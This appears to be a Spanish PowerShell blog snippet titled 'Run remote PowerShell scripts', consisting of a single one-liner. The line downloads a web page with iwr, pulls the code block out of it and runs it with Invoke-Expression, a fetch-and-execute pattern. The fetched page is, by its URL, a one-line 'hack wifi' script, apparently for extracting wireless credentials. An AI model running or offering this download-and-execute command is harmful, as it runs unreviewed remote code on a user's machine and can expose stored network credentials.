# Ejecutar scripts remotos de PowerShell
## PowerShell, Security 
### URL: https://www.jesusninoc.com/2017/02/02/ejecutar-scripts-remotos-de-powershell/
```PowerShell
Invoke-Expression ((iwr 'https://www.jesusninoc.com/2017/01/31/hackear-wifi-con-powershell-script-en-una-linea/').AllElements | Where class -eq 'crayon-pre').innerText

```
